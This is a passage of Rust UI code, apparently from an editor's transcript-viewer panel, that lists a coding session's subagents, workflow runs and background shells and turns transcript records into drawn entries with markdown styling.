            Some(false) | None => AgentState::Running,
        };
    }

    // Neither id, so nothing in the conversation pairs with this agent at all. A chip
    // that pulses for the rest of the session is worse than one that never pulses.
    AgentState::Finished
}

/// A run's cards split into the phases they belong to, in the order the phases first
/// appear, with the phase taken off each card because the heading above it now says it.
///
/// `None` as a group's phase means the cards under it name no phase, which is every card
/// of an `Agent` call and any agent of a run that recorded none: those are drawn without
/// a heading, exactly as they were before runs were grouped.
fn group_cards_by_phase(
    cards: Vec<AgentCardRow>,
    is_workflow_call: bool,
) -> Vec<(Option<SharedString>, Vec<AgentCardRow>)> {
    let mut groups: Vec<(Option<SharedString>, Vec<AgentCardRow>)> = Vec::new();

    for mut card in cards {
        // An `Agent` call spawns the one agent its card already accounts for, so its
        // cards are never grouped and keep whatever their own card says.
        let phase = if is_workflow_call {
            card.phase.take()
        } else {
            None
        };
        // Matched against every group rather than only the one last opened: a phase that
        // ran several agents at once has as many cards, and a later phase's card can sit
        // between two of them, which merging only neighbours would draw as the same phase
        // appearing twice.
        match groups
            .iter_mut()
            .find(|(grouped_phase, _)| *grouped_phase == phase)
        {
            Some((_, cards_of_phase)) => cards_of_phase.push(card),
            None => groups.push((phase, vec![card])),
        }
    }

    groups
}

/// What a phase heading says: the phase, and how many of its agents have returned.
fn phase_heading(phase: &SharedString, cards_of_phase: &[AgentCardRow]) -> SharedString {
    let finished = cards_of_phase
        .iter()
        .filter(|card| card.state == AgentState::Finished)
        .count();
    SharedString::from(format!(
        "{phase} · {finished}/{} done",
        cards_of_phase.len()
    ))
}

/// One line of the agent list drawn under a session's row.
///
/// A workflow run is a heading rather than something to open: the run itself has no
/// conversation of its own, only the agents it spawned, so it carries no target.
#[derive(Clone, Debug, PartialEq, Eq)]
enum SessionAgentRow {
    WorkflowRun {
        label: SharedString,
        note: SharedString,
    },
    Agent {
        label: SharedString,
        note: Option<SharedString>,
        /// One deeper for an agent belonging to a run, so that the run's heading reads as
        /// the thing its agents sit under.
        indent_level: usize,
        target: TranscriptTarget,
    },
    /// A command the session left running in the background. Its output goes to a file
    /// rather than into a conversation, so the row says what is running and opens nothing.
    Shell {
        label: SharedString,
        note: SharedString,
    },
}

/// The agent list of one session: the agents it spawned itself, then each workflow run it
/// started as a heading with that run's agents under it.
///
/// A run is drawn as a group rather than as more rows in one flat list because a single
/// `Workflow` call can spawn any number of agents, and flattened among a session's own
/// agents there is nothing to say which run an agent came from — only an opaque run id
/// repeated on every row.
///
/// The order within a group is the order the scan produced (by agent id), which is stable
/// across polls so that rows do not move while a reader is looking at them.
///
/// Only the agents still worth opening are drawn; see [`agent_row_is_offered`], which is
/// what `main_path` and `open_target` are for.
fn session_agent_rows(
    subagents: &[SubagentSummary],
    shells: &[BackgroundShell],
    main_path: &[&TranscriptRecord],
    open_target: &TranscriptTarget,
) -> Vec<SessionAgentRow> {
    let mut rows = Vec::new();

    for summary in subagents
        .iter()
        .filter(|summary| summary.workflow_run_id.is_none())
        .filter(|summary| agent_row_is_offered(summary, main_path, open_target))
    {
        rows.push(SessionAgentRow::Agent {
            label: agent_chip_label(summary),
            note: session_agent_row_note(summary),
            indent_level: 1,
            target: TranscriptTarget::Subagent {
                agent_id: summary.agent_id.clone(),
                workflow_run_id: None,
            },
        });
    }

    // Grouped by walking the runs in the order they first appear rather than by sorting
    // into a map, so that the groups keep the scan's order and a run added between polls
    // arrives at the end instead of reshuffling the ones above it.
    let mut runs_drawn: Vec<&String> = Vec::new();
    for summary in subagents {
        let Some(workflow_run_id) = summary.workflow_run_id.as_ref() else {
            continue;
        };
        if runs_drawn.contains(&workflow_run_id) {
            continue;
        }
        runs_drawn.push(workflow_run_id);

        let agents_of_run: Vec<&SubagentSummary> = subagents
            .iter()
            .filter(|other| other.workflow_run_id.as_ref() == Some(workflow_run_id))
            .collect();
        // Counted over the whole run rather than over the rows drawn under it: the
        // agents that have returned are gone from the list, not from the run, so a run
        // half-way through says `2/4 done` rather than `0/2 done`.
        let finished = agents_of_run
            .iter()
            .filter(|agent| agent.workflow_agent_finished == Some(true))
            .count();
        let offered: Vec<&SubagentSummary> = agents_of_run
            .iter()
            .copied()
            .filter(|agent| agent_row_is_offered(agent, main_path, open_target))
            .collect();
        // A run every agent of which has returned would be a heading with nothing under
        // it, which is a row that opens nothing.
        if offered.is_empty() {
            continue;
        }

        rows.push(SessionAgentRow::WorkflowRun {
            label: workflow_run_label(workflow_run_id),
            note: SharedString::from(format!("{finished}/{} done", agents_of_run.len())),
        });
        for agent in offered {
            rows.push(SessionAgentRow::Agent {
                label: agent_chip_label(agent),
                note: session_agent_row_note(agent),
                indent_level: 2,
                target: TranscriptTarget::Subagent {
                    agent_id: agent.agent_id.clone(),
                    workflow_run_id: agent.workflow_run_id.clone(),
                },
            });
        }
    }

    // Below the agents rather than among them: a shell is not a conversation, and a row
    // that opens nothing sitting between rows that do would read as one that failed to.
    for shell in shells.iter().filter(|shell| !shell.finished) {
        rows.push(SessionAgentRow::Shell {
            label: shell.label.clone(),
            note: SharedString::from(SHELL_RUNNING_NOTE),
        });
    }

    rows
}

/// Whether an agent is still worth offering a way into its conversation.
///
/// An agent that has returned is taken off every list it was on: what a row, a chip or a
/// card offers is a conversation to open, and a session that has run twenty agents would
/// otherwise bury the ones still working under the ones that are over. The conversation
/// the asking view is itself reading is the exception — it is opened already, and taking
/// it off the row it is named on would leave the reader looking at something no control
/// admits exists.
///
/// A session that is not the one being followed is judged against an empty conversation,
/// which is what [`agent_state`] reads to decide a `Task` agent is over, so such an agent
/// is kept: offering one that has returned is better than hiding one that is working.
fn agent_row_is_offered(
    summary: &SubagentSummary,
    main_path: &[&TranscriptRecord],
    open_target: &TranscriptTarget,
) -> bool {
    let is_open = match open_target {
        TranscriptTarget::Main => false,
        TranscriptTarget::Subagent {
            agent_id,
            workflow_run_id,
        } => *agent_id == summary.agent_id && *workflow_run_id == summary.workflow_run_id,
    };
    is_open || agent_state(summary, main_path) == AgentState::Running
}

/// A run id is `wf_` and a hash, all of which is too wide for a dock and none of which a
/// reader recognises. The heading says it is a workflow and keeps enough of the id to tell
/// two runs of the same script apart.
fn workflow_run_label(workflow_run_id: &str) -> SharedString {
    let identifier = workflow_run_id
        .strip_prefix(WORKFLOW_RUN_ID_PREFIX)
        .unwrap_or(workflow_run_id);
    SharedString::from(format!("Workflow {identifier}"))
}

/// The label and note of one agent row, laid out so that every row in the list puts its
/// note in the same place.
fn agent_row_body(
    label: SharedString,
    note: Option<SharedString>,
    label_color: Color,
) -> impl IntoElement {
    h_flex()
        .w_full()
        .gap_1()
        .justify_between()
        .child(
            Label::new(label)
                .size(LabelSize::XSmall)
                .color(label_color)
                .single_line(),
        )
        .children(note.map(|note| {
            Label::new(note)
                .size(LabelSize::XSmall)
                .color(Color::Hidden)
        }))
}

/// What a session list row says beside an agent's name, or `None` when it can say
/// nothing true about it.
///
/// A `Workflow` agent's run writes a journal recording which of its agents have returned,
/// and that journal is read by the same scan that found the agent, so the row can say
/// whether it is over and which phase it belongs to. A `Task` agent is only known to be
/// over from the tool result in its own session's conversation — see [`agent_state`] —
/// and the list reads no session's conversation but the selected one's. A row that said
/// `Running` for an agent that returned an hour ago would be worse than one that says
/// nothing, so it says nothing.
fn session_agent_row_note(summary: &SubagentSummary) -> Option<SharedString> {
    summary.workflow_run_id.as_ref()?;

    let state = match summary.workflow_agent_finished {
        Some(true) => "Finished",
        // No journal to read, or one that does not name this agent yet. Both are states a
        // run passes through while it is working.
        Some(false) | None => "Running",
    };
    let phase = summary
        .meta
        .workflow_phase
        .as_deref()
        .map(str::trim)
        .filter(|phase| !phase.is_empty());

    Some(match phase {
        Some(phase) => SharedString::from(format!("{state} · {phase}")),
        None => SharedString::from(state),
    })
}

/// Every `tool_result` block a record holds, as the id of the call it answers and the
/// text of the answer.
fn tool_result_texts(record: &TranscriptRecord) -> Vec<(&str, String)> {
    let Some(blocks) = record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
        .and_then(Value::as_array)
    else {
        return Vec::new();
    };

    blocks
        .iter()
        .filter(|block| block.get("type").and_then(Value::as_str) == Some(TOOL_RESULT_BLOCK_TYPE))
        .filter_map(|block| {
            let tool_use_id = block.get("tool_use_id").and_then(Value::as_str)?;
            Some((tool_use_id, block_content_text(block.get("content"))))
        })
        .collect()
}

/// What a chip says the agent is: what it was asked to do, or failing that which agent it
/// is. A description of nothing but whitespace is no label at all.
fn agent_chip_label(summary: &SubagentSummary) -> SharedString {
    if let Some(description) = summary
        .meta
        .description
        .as_deref()
        .map(str::trim)
        .filter(|description| !description.is_empty())
    {
        return SharedString::from(description.to_string());
    }

    // Taken by characters rather than bytes: agent ids are hexadecimal in practice, but
    // slicing an id that is not would panic partway through a character.
    let short_id: String = summary
        .agent_id
        .chars()
        .take(AGENT_ID_CHIP_CHARACTERS)
        .collect();
    SharedString::from(format!("{} {short_id}", summary.meta.agent_type))
}

/// What the chip's tooltip adds to its label: only the fields the agent actually
/// recorded, because a line reading `model: unknown` says less than no line.
fn agent_chip_tooltip(summary: &SubagentSummary) -> SharedString {
    let mut lines = vec![summary.meta.agent_type.clone()];
    if let Some(model) = summary.meta.model.as_deref() {
        lines.push(model.to_string());
    }
    lines.push(format!("depth {}", summary.meta.spawn_depth));
    if let Some(workflow_phase) = summary.meta.workflow_phase.as_deref() {
        lines.push(workflow_phase.to_string());
    }
    SharedString::from(lines.join("\n"))
}

/// The calls in a conversation that started conversations of their own, keyed by the
/// entry each call is drawn as, so that the card offering what it started can be hung
/// under exactly that row.
///
/// Keyed the way [`build_entries`] keys a block's entry; the two must agree or the card
/// lands under the wrong call.
fn agent_calls(path: &[&TranscriptRecord]) -> HashMap<SharedString, AgentCall> {
    let mut calls = HashMap::default();

    for (path_index, record) in path.iter().enumerate() {
        let Some(blocks) = record
            .raw
            .get("message")
            .and_then(|message| message.get("content"))
            .and_then(Value::as_array)
        else {
            continue;
        };
        let base_key = match record.uuid.as_ref() {
            Some(uuid) => SharedString::from(uuid.clone()),
            None => SharedString::from(format!("path-{path_index}")),
        };

        for (block_index, block) in blocks.iter().enumerate() {
            if block.get("type").and_then(Value::as_str) != Some(TOOL_USE_BLOCK_TYPE) {
                continue;
            }
            let is_workflow = match block.get("name").and_then(Value::as_str) {
                Some(AGENT_TOOL_NAME) => false,
                Some(WORKFLOW_TOOL_NAME) => true,
                _ => continue,
            };
            let Some(tool_use_id) = block.get("id").and_then(Value::as_str) else {
                continue;
            };
            calls.insert(
                SharedString::from(format!("{base_key}#{block_index}")),
                AgentCall {
                    tool_use_id: SharedString::from(tool_use_id.to_string()),
                    is_workflow,
                },
            );
        }
    }

    calls
}

/// The agents one call spawned, as the scan of the session's directory found them.
///
/// An `Agent` call is paired by the `tool_use_id` its agent's sidecar records. A
/// `Workflow` call spawns a run of agents that record no tool use id at all, so they are
/// paired through the run id the tool's own result announces — and until that result
/// arrives nothing links the two, which is why an unannounced run pairs with nothing
/// rather than with every agent of every run.
fn subagents_of_call<'summaries>(
    call: &AgentCall,
    subagents: &'summaries [SubagentSummary],
    main_path: &[&TranscriptRecord],
) -> Vec<&'summaries SubagentSummary> {
    if !call.is_workflow {
        return subagents
            .iter()
            .filter(|summary| {
                summary.meta.tool_use_id.as_deref() == Some(call.tool_use_id.as_ref())
            })
            .collect();
    }

    let Some(workflow_run_id) = announced_workflow_run_id(&call.tool_use_id, main_path) else {
        return Vec::new();
    };
    subagents
        .iter()
        .filter(|summary| summary.workflow_run_id.as_deref() == Some(workflow_run_id.as_str()))
        .collect()
}

/// One command the session left running with `Bash(run_in_background)`.
///
/// A background shell writes to a file rather than into the conversation, and the only
/// thing the conversation says about it after it starts is the notification that ends it.
/// So a reader watching the panel has no way of telling that one is running at all, which
/// is what listing them puts back.
#[derive(Clone, Debug, PartialEq, Eq)]
struct BackgroundShell {
    task_id: SharedString,
    /// What the call said it was for, failing that the head of the command it ran.
    label: SharedString,
    /// The whole command, which is the tooltip's to show; the label is only its head.
    command: Option<SharedString>,
    /// Where the output is being written, as the call's own result announced it.
    output_path: Option<SharedString>,
    /// Whether a notification has since said this shell ended, however it ended. What the
    /// panel offers is the ones still running, and a shell that failed is not one of them.
    finished: bool,
}

/// Every background shell the conversation records, in the order they were started.
///
/// Read down the whole conversation rather than the path the model can still see, for the
/// reason a question answered before compaction is still recorded: compaction severs that
/// chain, and a shell started
/// before one is still running after it — dropping it from the list would be the panel
/// claiming a running command had stopped.
fn background_shells<'records>(path: &[&'records TranscriptRecord]) -> Vec<BackgroundShell> {
    // The `Bash` inputs seen so far, keyed by call id. A call is written before the result
    // announcing the shell it started, so one forward pass pairs the two.
    let mut bash_calls: HashMap<&'records str, (Option<&'records str>, Option<&'records str>)> =
        HashMap::default();
    let mut shells: Vec<BackgroundShell> = Vec::new();

    for record in path.iter().copied() {
        let content = record
            .raw
            .get("message")
            .and_then(|message| message.get("content"));

        if let Some(blocks) = content.and_then(Value::as_array) {
            for block in blocks {
                if block.get("type").and_then(Value::as_str) != Some(TOOL_USE_BLOCK_TYPE)
                    || block.get("name").and_then(Value::as_str) != Some(BASH_TOOL_NAME)
                {
                    continue;
                }
                let Some(tool_use_id) = block.get("id").and_then(Value::as_str) else {
                    continue;
                };
                let argument = |key: &str| {
                    block
                        .get("input")
                        .and_then(|input| input.get(key))
                        .and_then(Value::as_str)
                        .map(str::trim)
                        .filter(|value| !value.is_empty())
                };
                bash_calls.insert(tool_use_id, (argument("description"), argument("command")));
            }
        }

        if let Some(task_id) = record
            .raw
            .get("toolUseResult")
            .and_then(|result| result.get(BACKGROUND_TASK_ID_FIELD))
            .and_then(Value::as_str)
            .map(str::trim)
            .filter(|task_id| !task_id.is_empty())
        {
            // A record can answer several calls at once; the backgrounded `Bash` is the
            // result whose id we have already seen as a `Bash` tool_use, failing that the
            // result whose text is the launch announcement. Taking `.first()` would name
            // the shell after whichever other call happened to be answered in the same
            // record.
            let results = tool_result_texts(record);
            let chosen = results
                .iter()
                .find(|(tool_use_id, _)| bash_calls.contains_key(tool_use_id))
                .or_else(|| {
                    results
                        .iter()
                        .find(|(_, announcement)| background_output_path(announcement).is_some())
                })
                .or_else(|| results.first());
            let (description, command) = chosen
                .and_then(|(tool_use_id, _)| bash_calls.get(tool_use_id))
                .copied()
                .unwrap_or((None, None));
            shells.push(BackgroundShell {
                task_id: SharedString::from(task_id.to_string()),
                label: background_shell_label(task_id, description, command),
                command: command.map(|command| SharedString::from(command.to_string())),
                output_path: chosen
                    .and_then(|(_, announcement)| background_output_path(announcement))
                    .map(SharedString::from),
                finished: false,
            });
        }

        // The notification arrives as words rather than as a tool result, in one of two
        // shapes: the message it is delivered as when the session was between turns, and
        // the attachment it is folded into when it arrived mid-turn and was absorbed into
        // the turn already running. Both are read, because which of them a shell gets is
        // decided by what the session happened to be doing when its command ended — so
        // reading only the first leaves most shells pulsing for the rest of the session.
        //
        // Both are tested as strings, which costs nothing: a record whose content is
        // blocks is never one of these, and joining every block's text to find out would
        // walk whole tool outputs on every draw.
        let notification = content
            .and_then(Value::as_str)
            .or_else(|| {
                record
                    .raw
                    .get("attachment")
                    .and_then(|attachment| attachment.get("prompt"))
                    .and_then(Value::as_str)
            })
            .and_then(task_notification_id);
        if let Some(task_id) = notification {
            // Applied now rather than collected and replayed over every shell at the end:
            // a later launch can reuse the same id, and a set of every id ever notified
            // would mark that new shell finished the moment it started.
            for shell in &mut shells {
                if shell.task_id.as_ref() == task_id {
                    shell.finished = true;
                }
            }
        }
    }

    shells
}

/// The shell or agent a queued task notification is about, or `None` for text that is not
/// one. Matched only when the wrapper is the whole message, so that a reader quoting the
/// words back — including at the front of a question — is not read as a shell ending.
fn task_notification_id(text: &str) -> Option<&str> {
    let text = text.trim();
    if !text.starts_with(TASK_NOTIFICATION_OPEN) {
        return None;
    }
    let (inside, rest) = text.split_once(TASK_NOTIFICATION_CLOSE)?;
    // Words after the wrapper are the reader asking about it, not the CLI reporting it.
    if !rest.trim().is_empty() {
        return None;
    }
    let (_, rest) = inside.split_once(TASK_NOTIFICATION_ID_OPEN)?;
    let (task_id, _) = rest.split_once(TASK_NOTIFICATION_ID_CLOSE)?;
    let task_id = task_id.trim();
    (!task_id.is_empty()).then_some(task_id)
}

/// The file a backgrounded call's own result says its output is being written to.
fn background_output_path(announcement: &str) -> Option<String> {
    let (_, rest) = announcement.split_once(BACKGROUND_OUTPUT_PREFIX)?;
    let path = match rest.split_once(BACKGROUND_OUTPUT_FOLLOWING_SENTENCE) {
        Some((path, _)) => path,
        None => match rest.split_once(". ") {
            Some((path, _)) => path,
            None => rest.trim_end().trim_end_matches('.'),
        },
    };
    let path = path.trim();
    (!path.is_empty()).then(|| path.to_string())
}

/// What a background shell is called in the list: what the call said it was for, failing
/// that the head of the command it ran, failing that the id the notifications name it by.
fn background_shell_label(
    task_id: &str,
    description: Option<&str>,
    command: Option<&str>,
) -> SharedString {
    if let Some(description) = description {
        return SharedString::from(description.to_string());
    }

    // A command is often a whole pipeline written over several lines, of which the first
    // is what says which call it is.
    if let Some(first_line) = command
        .and_then(|command| command.lines().next())
        .map(str::trim)
        .filter(|line| !line.is_empty())
    {
        return SharedString::from(truncate_and_trailoff(first_line, SHELL_LABEL_CHARACTERS));
    }

    SharedString::from(format!("Shell {task_id}"))
}

/// What a shell's tooltip adds to its label: only what the call actually recorded, because
/// a line reading `Output: unknown` says less than no line.
fn background_shell_tooltip(shell: &BackgroundShell) -> SharedString {
    let mut lines = vec![format!("Background shell {}", shell.task_id)];
    if let Some(command) = shell.command.as_deref() {
        lines.push(truncate_and_trailoff(
            command,
            SHELL_TOOLTIP_COMMAND_CHARACTERS,
        ));
    }
    if let Some(output_path) = shell.output_path.as_deref() {
        lines.push(format!("Output: {output_path}"));
    }
    SharedString::from(lines.join("\n"))
}

/// The run id the `Workflow` call's own result announces.
fn announced_workflow_run_id(tool_use_id: &str, main_path: &[&TranscriptRecord]) -> Option<String> {
    main_path.iter().find_map(|record| {
        tool_result_texts(record)
            .into_iter()
            .filter(|(id, _)| *id == tool_use_id)
            .find_map(|(_, text)| workflow_run_id_in_tool_result(&text))
    })
}

/// The line drawn above the input for an activity, or `None` for one that is not worth a
/// line.
#[cfg(test)]
fn activity_label(activity: &Activity) -> Option<SharedString> {
    Some(match activity {
        // Withheld so that the line does not appear and disappear at the end of every
        // turn, moving the input under the reader's hands.
        Activity::Idle => return None,
        Activity::Thinking => SharedString::from(THINKING_NOTE),
        Activity::RunningTool { name, target } if target.is_empty() => {
            SharedString::from(format!("Running {name}"))
        }
        Activity::RunningTool { name, target } => {
            SharedString::from(format!("Running {name}: {target}"))
        }
    })
}

/// The panel is a side panel, so the two sides a setting can name are the two positions
/// it has.
fn dock_position(dock: DockSide) -> DockPosition {
    match dock {
        DockSide::Left => DockPosition::Left,
        DockSide::Right => DockPosition::Right,
    }
}

/// The ground the conversation is read against: darker than the editor's own, which
/// separates a tab of messages from a tab of code and gives the tinted code blocks
/// inside it something to sit on.
///
/// Only a dark theme is darkened. The same shift applied to a light one would turn its
/// background grey without making anything easier to read.
fn conversation_background(cx: &App) -> Hsla {
    let editor_background = cx.theme().colors().editor_background;
    match cx.theme().appearance() {
        Appearance::Dark => editor_background.blend(gpui::black().opacity(0.4)),
        Appearance::Light => editor_background,
    }
}

/// Makes the conversation read as markdown rather than as flat text: headings carry
/// weight as well as size, code is tinted apart from prose, and a quote is marked by an
/// accent instead of by the same border colour as every other rule in the panel.
///
/// Refined here rather than in [`MarkdownStyle::themed`], which the agent panel shares.
/// The sizes stay below the markdown preview's: this is a conversation of many short
/// messages, and preview-sized headings would leave little room for the prose under them.
fn markdown_style(window: &Window, cx: &App) -> MarkdownStyle {
    let colors = cx.theme().colors();
    let mut style = MarkdownStyle::themed(MarkdownFont::Agent, window, cx);

    let heading = |font_size: Rems, font_weight: FontWeight| TextStyleRefinement {
        font_size: Some(font_size.into()),
        font_weight: Some(font_weight),
        line_height: Some(relative(1.3)),
        ..Default::default()
    };
    style.heading_level_styles = Some(HeadingLevelStyles {
        h1: Some(heading(rems(1.3), FontWeight::BOLD)),
        h2: Some(heading(rems(1.15), FontWeight::BOLD)),
        h3: Some(heading(rems(1.05), FontWeight::SEMIBOLD)),
        h4: Some(heading(rems(1.), FontWeight::SEMIBOLD)),
        h5: Some(heading(rems(0.95), FontWeight::SEMIBOLD)),
        h6: Some(heading(rems(0.875), FontWeight::SEMIBOLD)),
    });
    style.heading.margin.top = Some(Length::Definite(px(12.).into()));
    style.heading.margin.bottom = Some(Length::Definite(px(4.).into()));

    // Inline code is a span of text, so its background is all it can be given — neither
    // padding nor a corner radius reaches a `TextStyleRefinement`. The accent colour is
    // what separates it from the prose around it at a glance.
    style.inline_code.color = Some(colors.text_accent);

    let corner_radius = AbsoluteLength::Pixels(px(6.));
    style.code_block.corner_radii.top_left = Some(corner_radius);
    style.code_block.corner_radii.top_right = Some(corner_radius);
    style.code_block.corner_radii.bottom_left = Some(corner_radius);
    style.code_block.corner_radii.bottom_right = Some(corner_radius);

    // The themed line height is 1.75 times the *buffer* font size while this text is set
    // at the larger UI font size, which leaves the lines of a paragraph nearly touching.
    // Relative to the text's own size instead, so that changing either font size keeps
    // the same rhythm.
    style.base_text_style.line_height = relative(CONVERSATION_LINE_HEIGHT);
    style.paragraph_line_height = relative(CONVERSATION_LINE_HEIGHT);

    // A blank line between paragraphs has to read as a blank line. The themed spacing is
    // a flat 8px against lines that are around 24px tall, so two paragraphs ran together
    // as though the second were a wrapped continuation of the first. One line's height is
    // exactly what the author typed — an empty line — so that is what it is set to.
    let line =
        style.base_text_style.font_size.to_pixels(window.rem_size()) * CONVERSATION_LINE_HEIGHT;
    style.paragraph_spacing = line;

    style.block_quote.color = Some(colors.text_muted);
    style.block_quote_border_color = colors.text_accent.opacity(0.4);

    // Top-level list items run into each other without it.
    style.list_spacing = px(4.);

    style
}

/// A tool's output is drawn inside the panel's own framed card, so the code block that
/// carries the text must not draw a second frame inside that one.
fn tool_output_markdown_style(window: &Window, cx: &App) -> MarkdownStyle {
    let mut style = markdown_style(window, cx);
    style.code_block.border_widths = Default::default();
    style.code_block.margin = Default::default();
    style.code_block.background = None;
    style
}

/// Flattens a conversation path into the items the list draws, deriving each record's
/// expensive artifacts only the first time the record is seen.
fn build_entries(
    path: &[&TranscriptRecord],
    home_directory: Option<&Path>,
    cache: &mut EntryCache,
) -> Vec<Entry> {
    let mut entries = Vec::with_capacity(path.len());
    let mut attachments = Vec::new();
    // `tool_result` blocks name the call they answer by id, so the ids seen on the way
    // down the path are what lets a result be labelled with its tool's name.
    let mut tool_names: HashMap<String, SharedString> = HashMap::default();
    let mut last_user_index: Option<usize> = None;

    for (path_index, record) in path.iter().enumerate() {
        let base_key = record_base_key(record, path_index);
        let before = entries.len();
        append_record(
            record,
            base_key,
            home_directory,
            &mut tool_names,
            &mut entries,
            &mut attachments,
            cache,
        );

        if let Some(offset) = entries.get(before..).and_then(|added| {
            added
                .iter()
                .position(|entry| entry_starts_a_turn(&entry.kind))
        }) {
            let user_index = before.saturating_add(offset);
            if last_user_index.is_some() {
                let shifted =
                    flush_turn_attachments(&mut entries, &mut attachments, last_user_index);
                last_user_index = Some(user_index.saturating_add(shifted));
            } else {
                last_user_index = Some(user_index);
            }
        }
    }

    flush_turn_attachments(&mut entries, &mut attachments, last_user_index);
    entries
}

/// The key every entry derived from one record is keyed under, alone or with the block's
/// index appended. A record without a uuid is keyed by its position in the conversation.
fn record_base_key(record: &TranscriptRecord, path_index: usize) -> SharedString {
    match record.uuid.as_ref() {
        Some(uuid) => SharedString::from(uuid.clone()),
        None => SharedString::from(format!("path-{path_index}")),
    }
}

fn entry_starts_a_turn(kind: &EntryKind) -> bool {
    matches!(
        kind,
        EntryKind::Message {
            role: MessageRole::User,
            ..
        } | EntryKind::SlashCommand { .. }
            | EntryKind::Queued { .. }
    )
}

fn flush_turn_attachments(
    entries: &mut Vec<Entry>,
    attachments: &mut Vec<AttachmentItem>,
    last_user_index: Option<usize>,
) -> usize {
    if attachments.is_empty() {
        return 0;
    }
    let items = std::mem::take(attachments);
    let key = items
        .first()
        .map(|item| SharedString::from(format!("context-{}", item.key)))
        .unwrap_or_else(|| SharedString::from(ATTACHMENTS_ENTRY_KEY));
    let insert_at = last_user_index
        .map(|index| index.saturating_add(1))
        .unwrap_or(entries.len())
        .min(entries.len());
    entries.insert(
        insert_at,
        Entry {
            key,
            kind: EntryKind::Attachments { items },
        },
    );
    1
}

fn append_record(
    record: &TranscriptRecord,
    base_key: SharedString,
    home_directory: Option<&Path>,
    tool_names: &mut HashMap<String, SharedString>,
    entries: &mut Vec<Entry>,
    attachments: &mut Vec<AttachmentItem>,
    cache: &mut EntryCache,
) {
    cache.remember_timestamp(Some(&base_key), record);

    // Context Claude Code injected into the turn rather than anything either side said:
    // a skill's instructions, an expanded command, the output of a hook. These carry the
    // user's own role and can run to tens of thousands of lines, so drawn as messages
    // they bury the conversation they were injected into. Records that carry an origin
    // or promptSource are classified by those fields instead — a peer's isMeta message
    // is still a message.
    if record
        .raw
        .get("isMeta")
        .and_then(Value::as_bool)
        .unwrap_or(false)
        && origin_kind(record).is_none()
        && prompt_source(record).is_none()
    {
        return;
    }

    if origin_kind(record) == Some(TASK_NOTIFICATION_ORIGIN) {
        if let Some(text) = task_notification_context_text(record) {
            let cache_key = cache_key(record, &base_key);
            attachments.push(cache.attachment(cache_key.as_ref(), || AttachmentItem {
                key: base_key.clone(),
                label: SharedString::from("system-notification"),
                body: SharedString::from(text),
                persisted: None,
            }));
        }
        return;
    }

    if record.record_type == ATTACHMENT_RECORD_TYPE {
        // A message typed while the session was answering is the reader's own, and
        // belongs in the conversation where they typed it rather than in the folded
        // context section beside the attachments Claude Code injected.
        //
        // It is recorded as an attachment because of when it arrived: the user record it
        // would have been is written when the turn it was queued behind finishes, and it
        // is written with no content at all — the text is only here. Drawn from the
        // attachment, and skipped as an empty record there, the message appears once.
        let prompt = queued_command_prompt(record);
        let images = queued_command_images(record);
        if prompt.is_some() || !images.is_empty() {
            let cache_key = cache_key(record, &base_key);
            if let Some(prompt) = prompt {
                let kind = cache.kind(cache_key.as_ref(), || EntryKind::Message {
                    role: MessageRole::User,
                    source: prompt,
                    usage: None,
                    answered_at: None,
                });
                entries.push(Entry {
                    key: base_key.clone(),
                    kind,
                });
            }
            for (index, block) in images.into_iter().enumerate() {
                let key = SharedString::from(format!("{base_key}#image-{index}"));
                // Keyed off the record's own cache key so that a decoded image survives
                // the conversation being rebuilt around it, as every other one does.
                let image_cache_key = cache_key
                    .as_ref()
                    .map(|cache_key| SharedString::from(format!("{cache_key}#image-{index}")));
                let kind = cache.kind(image_cache_key.as_ref(), || image_kind(block));
                entries.push(Entry { key, kind });
            }
            return;
        }

        if is_toolbar_attachment(record) {
            return;
        }

        let cache_key = cache_key(record, &base_key);
        attachments.push(cache.attachment(cache_key.as_ref(), || {
            attachment_item(record, base_key.clone(), home_directory)
        }));
        return;
    }

    if record.record_type == SYSTEM_RECORD_TYPE {
        match record.subtype.as_deref() {
            Some(COMPACT_BOUNDARY_SUBTYPE) => {
                let cache_key = cache_key(record, &base_key);
                let kind = cache.kind(cache_key.as_ref(), || {
                    let metadata = record.compact_metadata.as_ref();
                    EntryKind::CompactBoundary {
                        trigger: metadata
                            .map(|metadata| SharedString::from(metadata.trigger.clone()))
                            .unwrap_or_else(|| SharedString::from("unknown")),
                        pre_tokens: metadata.and_then(|metadata| metadata.pre_tokens),
                        post_tokens: metadata.and_then(|metadata| metadata.post_tokens),
                    }
                });
                entries.push(Entry {
                    key: base_key,
                    kind,
                });
                return;
            }
            Some(TURN_DURATION_SUBTYPE) => {
                let cache_key = cache_key(record, &base_key);
                let kind = cache.kind(cache_key.as_ref(), || turn_footer_kind(record));
                entries.push(Entry {
                    key: base_key,
                    kind,
                });
                return;
            }
            // Bookkeeping about hooks having run, with nothing in it for the reader:
            // drawn, it put an `Unrecognized` row after every turn. A hook that printed
            // something for the reader writes it into this same record, and no other
            // record holds it, so that one is drawn as the note it is.
            Some(STOP_HOOK_SUMMARY_SUBTYPE)
                if record
                    .raw
                    .get("content")
                    .and_then(Value::as_str)
                    .is_none_or(|content| content.trim().is_empty()) =>
            {
                return;
            }
            Some(LOCAL_COMMAND_SUBTYPE) => {
                let cache_key = cache_key(record, &base_key);
                let kind = cache.kind(cache_key.as_ref(), || {
                    match record.raw.get("content").and_then(Value::as_str) {
                        Some(content) => EntryKind::LocalCommand {
                            text: SharedString::from(strip_ansi_escapes(content)),
                        },
                        None => unknown_kind(
                            &record.record_type,
                            record.subtype.as_deref(),
                            &record.raw,
                        ),
                    }
                });
                entries.push(Entry {
                    key: base_key,
                    kind,
                });
                return;
            }
            _ => {
                let cache_key = cache_key(record, &base_key);
                let kind = cache.kind(cache_key.as_ref(), || system_note_kind(record));
                entries.push(Entry {
                    key: base_key,
                    kind,
                });
                return;
            }
        }
    }

    match record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
    {
        Some(Value::String(text)) => {
            let cache_key = cache_key(record, &base_key);
            // A record with nothing but injected context in it is left out of the
            // conversation rather than drawn as an empty message.
            if let Some(kind) =
                cache.optional_kind(cache_key.as_ref(), || message_kind(record, text))
            {
                entries.push(Entry {
                    key: base_key,
                    kind,
                });
            }
        }
        Some(Value::Array(blocks)) => {
            for (block_index, block) in blocks.iter().enumerate() {
                let key = SharedString::from(format!("{base_key}#{block_index}"));
                // Registered outside the cache: a `tool_result` block being built for the
                // first time looks up the name of its call here, and the `tool_use` block
                // that named it may itself have come from the cache.
                register_tool_name(block, tool_names);
                if block.get("type").and_then(Value::as_str) == Some("tool_result") {
                    let first_cache_key = cache_key(record, &key);
